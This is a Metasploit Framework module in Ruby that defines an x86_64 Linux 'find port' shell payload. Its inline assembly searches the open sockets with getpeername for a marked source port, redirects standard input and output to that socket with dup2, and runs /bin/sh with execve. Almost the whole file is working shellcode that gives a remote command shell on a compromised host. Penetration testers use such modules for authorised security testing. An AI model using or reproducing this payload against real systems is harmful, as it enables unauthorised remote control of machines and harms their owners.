##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::FindPort'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Find Port Inline',
      'Description'   => 'Spawn a shell on an established connection',
      'Author'        => 'mak',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86_64,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'CPORT' => [ 32, 'n' ],
            },

          'Assembly' => %Q|
            xor rdi,rdi
            xor rbx,rbx
            mov bl,0x14
            sub rsp,rbx
            lea rdx,[rsp]
            lea rsi,[rsp+4]
          find_port:
            push 0x34     ; getpeername
            pop rax
            syscall
            inc rdi
            cmp word [rsi+2],0x4142
            jne find_port
            dec rdi
            push 2
            pop rsi
          dup2:
            push 0x21     ; dup2
            pop rax
            syscall
            dec rsi
            jns dup2
            mov rbx,rsi
            mov ebx, 0x68732f41
            mov eax,0x6e69622f
            shr rbx,8
            shl rbx,32
            or  rax,rbx
            push rax
            mov rdi,rsp
            xor rsi,rsi
            mov rdx,rsi
            push 0x3b     ; execve
            pop rax
            syscall
          |
        }
      ))
  end

  def size
    return 91
  end


end
